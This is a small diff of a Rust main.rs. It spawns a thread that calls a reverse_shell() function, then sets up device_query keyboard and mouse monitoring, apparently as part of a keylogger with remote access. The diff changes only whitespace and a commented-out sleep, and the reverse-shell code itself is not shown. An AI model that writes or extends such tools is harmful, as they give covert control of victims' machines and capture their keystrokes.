@@ -3,7 +3,6 @@ extern crate dotenv;
 mod lib;
 
 use std::{ thread };
-
 use device_query::{ DeviceState, DeviceEvents };
 use lib::{ match_case, reverse_shell };
 
@@ -16,7 +15,6 @@ fn main() {
    
     thread::spawn( move|| {
             reverse_shell();
-            // thread::sleep(Duration::from_millis(1000));
     });
 
     // create a device state
